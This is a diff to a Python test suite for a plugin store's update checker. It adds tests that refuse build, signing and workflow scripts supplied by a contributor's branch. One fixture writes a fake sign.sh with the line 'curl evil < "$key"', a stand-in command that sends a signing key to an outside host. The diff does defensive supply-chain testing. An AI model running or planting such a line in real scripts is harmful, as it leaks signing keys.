@@ -10,7 +10,6 @@ import subprocess
 import sys
 import tempfile
 import unittest
-import unittest.mock
 
 sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
 import store_update  # noqa: E402
@@ -27,9 +26,21 @@ class Classify(unittest.TestCase):
     def test_the_plugin_its_tooling_and_the_texts_are_its_own(self):
         own, reported, refused = store_update.classify(
             ["plugins/notes-vault/src/lib.rs", "tools/plugin-files/plugins.txt",
-             "tools/plugin-files/src/bin/notes-vault.rs", "CHANGELOG.md", "docs/data-files.md"],
+             "tools/plugin-files/src/bin/notes-vault.rs", "tools/plugin-files/Cargo.toml",
+             "tools/plugin-files/Cargo.lock", "CHANGELOG.md", "docs/data-files.md"],
             "notes-vault")
-        self.assertEqual((len(own), reported, refused), (5, [], []))
+        self.assertEqual((len(own), reported, refused), (7, [], []))
+
+    def test_the_scripts_and_the_workflows_are_never_the_branch_s(self):
+        # What runs the checks, the build and the signing is the trusted checkout's.
+        scripts = ["tools/plugin-files/store_update.py", "tools/plugin-files/sign.sh",
+                   "tools/plugin-files/build.sh", "tools/plugin-files/check_files.sh",
+                   "tools/plugin-files/catalogue.py", "tools/plugin-files/paperpaw-plugin.x",
+                   "tools/plugin-files/rust-toolchain.toml", "tools/plugin-files/keyboards/x.ini",
+                   ".github/workflows/store-plugin.yml", ".github/actions/xteink-tools/action.yml",
+                   "tools/xtensa-std/build.sh", "tools/ci/build-prerequisites.sh"]
+        own, reported, refused = store_update.classify(scripts, "notes-vault")
+        self.assertEqual((own, reported, refused), ([], [], scripts))
 
     def test_the_workspace_s_lists_are_reported_and_the_rest_is_refused(self):
         own, reported, refused = store_update.classify(
@@ -60,9 +71,6 @@ class Check(unittest.TestCase):
         self.write("crates/core/lib.rs", "// base\n")
         self.commit("base")
         self.git("tag", "v0.6.0-beta.1")
-        patch = unittest.mock.patch.object(versions, "ROOT", self.root)
-        patch.start()
-        self.addCleanup(patch.stop)
 
     def git(self, *args):
         subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", *args], cwd=self.root,
@@ -78,7 +86,7 @@ class Check(unittest.TestCase):
         self.git("commit", "-q", "-m", message)
 
     def check(self, plugin, accepted=()):
-        return store_update.check(plugin, "v0.6.0-beta.1", accepted)
+        return store_update.check(self.root, plugin, "v0.6.0-beta.1", accepted)
 
     def test_a_new_plugin_needs_no_older_version(self):
         self.write("plugins/new/Cargo.toml", manifest("1.0.0"))
@@ -107,6 +115,13 @@ class Check(unittest.TestCase):
         self.assertEqual((version, problems), ("1.0.0", []))
         self.assertTrue(any("crates/core/lib.rs" in n for n in notes), notes)
 
+    def test_a_branch_with_its_own_signing_script_is_refused(self):
+        self.write("plugins/new/Cargo.toml", manifest("1.0.0"))
+        self.write("tools/plugin-files/sign.sh", "#!/bin/sh\ncurl evil < \"$key\"\n")
+        self.commit("new and sign.sh")
+        _, problems, _ = self.check("new")
+        self.assertTrue(any("tools/plugin-files/sign.sh" in p for p in problems), problems)
+
     def test_a_source_not_made_from_the_base_is_refused(self):
         self.git("checkout", "-q", "--orphan", "other")
         self.write("plugins/new/Cargo.toml", manifest("1.0.0"))
@@ -118,7 +133,7 @@ class Check(unittest.TestCase):
         self.assertIn("no such plugin", self.check("nothing")[1][0])
         self.write("plugins/new/Cargo.toml", manifest("1.0.0"))
         self.commit("new")
-        _, problems, _ = store_update.check("new", "v9.9.9")
+        _, problems, _ = store_update.check(self.root, "new", "v9.9.9")
         self.assertIn("fetch the base's tag", problems[0])
 
     def test_the_command_prints_the_version_and_fails_with_a_reason(self):
@@ -126,13 +141,13 @@ class Check(unittest.TestCase):
         self.commit("new")
         out, err = io.StringIO(), io.StringIO()
         with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
-            status = store_update.main(["new", "v0.6.0-beta.1"])
+            status = store_update.main(["new", "v0.6.0-beta.1", "--source", str(self.root)])
         self.assertEqual((status, out.getvalue()), (0, "1.2.3\n"))
         self.write("crates/core/lib.rs", "// changed\n")
         self.commit("kernel")
         out, err = io.StringIO(), io.StringIO()
         with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
-            status = store_update.main(["new", "v0.6.0-beta.1"])
+            status = store_update.main(["new", "v0.6.0-beta.1", "--source", str(self.root)])
         self.assertEqual((status, out.getvalue()), (1, ""))
         self.assertIn("::error::", err.getvalue())
 
